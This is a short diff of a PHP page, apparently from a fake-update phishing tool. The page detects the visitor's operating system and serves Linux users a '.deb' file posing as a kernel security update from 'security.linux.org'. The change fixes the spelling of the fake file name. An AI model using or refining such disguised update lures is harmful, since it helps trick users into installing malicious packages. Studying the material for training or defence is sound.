@@ -2,7 +2,7 @@
 // g0tmi1k
 if (stripos($_SERVER['HTTP_USER_AGENT'], 'linux') !== FALSE) {
       $OS = "Linux";
-    $file = "http://security.linux.org/kernal_1.83.90-5+lenny2_i386.deb";
+    $file = "http://security.linux.org/kernel_1.83.90-5+lenny2_i386.deb";
 }
  elseif (stripos($_SERVER['HTTP_USER_AGENT'], 'mac') !== FALSE) {
       $OS = "OSX";
